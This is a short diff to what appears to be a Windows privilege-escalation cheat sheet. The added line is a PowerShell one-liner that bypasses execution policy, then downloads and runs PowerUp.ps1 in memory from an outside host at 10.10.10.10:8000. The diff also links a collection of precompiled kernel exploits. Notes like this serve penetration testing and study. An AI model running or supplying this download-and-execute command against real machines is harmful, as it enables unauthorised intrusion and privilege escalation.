@@ -757,7 +757,7 @@ windows-privesc-check
 ```
 General privesc powershell script
 ```
-powerup.ps1
+C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://10.10.10.10:8000/PowerUp.ps1’); Invoke-AllChecks”
 ```
 https://github.com/SecWiki/windows-kernel-exploits : Exploits with examples/precompiled
 
